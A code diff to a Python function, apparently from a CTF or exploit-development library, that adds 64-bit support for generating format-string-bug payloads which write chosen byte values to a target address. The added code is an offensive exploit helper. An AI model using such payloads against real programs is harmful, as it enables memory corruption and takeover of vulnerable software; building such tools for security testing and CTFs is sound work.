@@ -57,9 +57,61 @@ def fsb(pos, writes, bs=1, written=0, bits=32):
             i += 1
             
     elif bits == 64:
-        dump("fsb: Sorry, not implemented yet", "debug")
+        if len(writes) == 1:
+            if bs == 1:
+                if 0 <= list(writes.values())[0] <= 0xff:
+                    table = list(writes.items())[0]
+                else:
+                    dump("fsb: Only values between 0 to 0xff can be writable in 64-bit mode", "warning")
+                    dump("fsb: Split your payload if you can use several FSBs", "warning")
+                    return None
+            elif bs == 2:
+                if 0 <= list(writes.values())[0] <= 0xffff:
+                    table = list(writes.items())[0]
+                else:
+                    dump("fsb: Only values between 0 to 0xffff can be writable in 64-bit mode", "warning")
+                    dump("fsb: Split your payload if you can use several FSBs", "warning")
+                    return None
+            elif bs == 4:
+                if 0 <= list(writes.values())[0] <= 0xffffffff:
+                    table = list(writes.items())[0]
+                else:
+                    dump("fsb: Only values between 0 to 0xffffffff can be writable in 64-bit mode", "warning")
+                    dump("fsb: Split your payload if you can use several FSBs", "warning")
+                    return None
+        else:
+            dump("fsb: Only one address can be writable in 64-bit mode", "warning")
+            dump("fsb: Split your payload if you can use several FSBs", "warning")
+            return None
+
+        n = written
+        paylen = written + 7 + len(prefix) + len(str(pos))
+        if paylen % 8 != 0:
+            paylen += 8 - (paylen % 8)
+        pos += paylen // 8
+        
+        post_paylen = written + 7 + len(prefix) + len(str(pos))
+        if post_paylen % 8 != 0:
+            post_paylen += 8 - (post_paylen % 8)
+        
+        if post_paylen != paylen:
+            paylen = post_paylen
+            pos += 1
+        
+        if bs == 1:
+            l = ((table[1] - n - 1) & 0xff) + 1
+        elif bs == 2:
+            l = ((table[1] - n - 1) & 0xffff) + 1
+        elif bs == 4:
+            l = ((table[1] - n - 1) & 0xffffffff) + 1
+        payload = str2bytes("%{0:03}c%{1}${2}".format(
+            l, pos, prefix
+        ))
+        payload += b'A' * (paylen - len(payload))
+        payload += p64(table[0]).rstrip(b'\x00')
         
     else:
         dump("fsb: Invalid bits specified", "warning")
         return None
+    
     return payload
